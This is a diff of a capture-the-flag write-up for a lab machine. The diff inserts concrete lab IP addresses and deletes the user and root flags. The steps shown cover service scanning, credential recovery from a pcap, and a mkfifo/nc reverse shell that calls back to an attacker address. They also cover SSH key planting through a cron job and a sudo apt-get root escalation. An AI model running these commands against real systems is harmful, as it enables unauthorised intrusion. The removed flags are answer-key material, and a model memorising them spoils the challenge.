@@ -9,7 +9,7 @@ Linux Ubuntu 16.04 machine with HTTP and SSH exposed. The attack path requires a
 ### Network Scanning
 
 ```bash
-nmap -sC -sV <target_ip>
+nmap -sC -sV 10.65.155.126
 ```
 
 Open ports:
@@ -20,7 +20,7 @@ Open ports:
 ### Directory Enumeration
 
 ```bash
-gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://10.65.155.126 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 Result: `/mail` (Status 301)
@@ -30,7 +30,7 @@ Result: `/mail` (Status 301)
 The `/mail` path contained a link to a downloadable `.pcap` file. After downloading it:
 
 ```bash
-wget http://<target_ip>/mail/<file>.pcap
+wget http://10.65.155.126/mail/<file>.pcap
 wireshark <file>.pcap
 ```
 
@@ -39,7 +39,7 @@ Following the TCP stream revealed an HTTP POST request with credentials submitte
 Added the entry to `/etc/hosts`:
 
 ```
-<target_ip>   development.smag.thm
+10.65.155.126   development.smag.thm
 ```
 
 ---
@@ -61,7 +61,7 @@ nc -lvnp 1234
 Sent a `mkfifo` reverse shell payload through the web panel:
 
 ```bash
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 1234 >/tmp/f
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.65.100.227 1234 >/tmp/f
 ```
 
 Shell obtained as `www-data`.
@@ -95,14 +95,9 @@ echo "<public key content>" > /opt/.backups/jake_id_rsa.pub.backup
 After the cron fired, connected as jake:
 
 ```bash
-ssh -i jake_key jake@<target_ip>
+ssh -i jake_key jake@10.65.155.126
 ```
 
-User flag:
-
-```
-iusGorV7EbmxM5AuIe2w499msaSuqU3j
-```
 
 ### sudo apt-get via GTFOBins (jake to root)
 
@@ -123,21 +118,6 @@ sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
 ```
 
 Root shell obtained.
-
-Root flag:
-
-```
-uJr6zRgetaniyHVRqqL58uRasybBKz2T
-```
-
----
-
-## Flags
-
-```
-user.txt  -> iusGorV7EbmxM5AuIe2w499msaSuqU3j
-root.txt  -> uJr6zRgetaniyHVRqqL58uRasybBKz2T
-```
 
 ---
 
